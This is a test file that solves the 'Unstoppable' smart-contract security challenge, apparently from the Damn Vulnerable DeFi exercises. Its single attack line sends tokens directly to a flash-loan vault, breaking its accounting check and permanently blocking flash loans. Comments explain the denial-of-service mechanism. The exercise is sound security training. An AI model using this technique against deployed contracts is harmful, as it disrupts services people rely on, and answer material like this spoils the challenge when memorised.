const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer, player, someUser;
    let token, vault, receiverContract;

    const TOKENS_IN_VAULT = 1000000n * 10n ** 18n;
    const INITIAL_PLAYER_TOKEN_BALANCE = 10n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, player, someUser] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        vault = await (await ethers.getContractFactory('UnstoppableVault', deployer)).deploy(
            token.address,
            deployer.address, // owner
            deployer.address // fee recipient
        );
        expect(await vault.asset()).to.eq(token.address);

        await token.approve(vault.address, TOKENS_IN_VAULT);
        await vault.deposit(TOKENS_IN_VAULT, deployer.address);

        expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT);
        expect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT);
        expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT);
        expect(await vault.maxFlashLoan(token.address)).to.eq(TOKENS_IN_VAULT);
        expect(await vault.flashFee(token.address, TOKENS_IN_VAULT - 1n)).to.eq(0);
        expect(
            await vault.flashFee(token.address, TOKENS_IN_VAULT)
        ).to.eq(50000n * 10n ** 18n);

        await token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(INITIAL_PLAYER_TOKEN_BALANCE);

        // Show it's possible for someUser to take out a flash loan
        receiverContract = await (await ethers.getContractFactory('ReceiverUnstoppable', someUser)).deploy(
            vault.address
        );
        await receiverContract.executeFlashLoan(100n * 10n ** 18n);
    });

    it('Execution', async function () {
        /**
         * This test simulates a scenario where an attacker (player) transfers
         * tokens directly to the vault contract without using the designated deposit function.
         * 
         * The attack is based on the following understanding:
         * - The vault's internal accounting mechanism relies on the balance of the contract
         *   matching the result of `convertToShares(totalSupply)`.
         * - If tokens are transferred directly to the contract, the balance increases,
         *   but the internal share accounting remains unchanged.
         * 
         * This discrepancy can be exploited to create a DoS attack by consistently causing 
         * the flash loan function to fail, as the accounting check will always fail.
         * 
         * The following code executes the attack:
         */
        
        // The attacker transfers tokens directly to the vault contract.
        // This action bypasses the deposit function, which is supposed to handle
        // both the token transfer and the share accounting update.
        await token.connect(player).transfer(vault.address, 2);
    
        /**
         * After the above transfer, the contract's token balance is higher than expected.
         * 
         * The next time the `flashLoan` function is called:
         * - The line `if (convertToShares(totalSupply) != balanceBefore)` will check if the
         *   internal accounting matches the actual balance.
         * - Since the balance was increased without updating the shares, this check will fail.
         * - The transaction will revert with `InvalidBalance()`, preventing any flash loans
         *   from being executed.
         * 
         * As a result, the attacker can create a Denial of Service (DoS) condition on the 
         * flash loan functionality, disrupting the normal operations of the contract.
         */
    });
    

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // It is no longer possible to execute flash loans
        await expect(
            receiverContract.executeFlashLoan(100n * 10n ** 18n)
        ).to.be.reverted;
    });
});
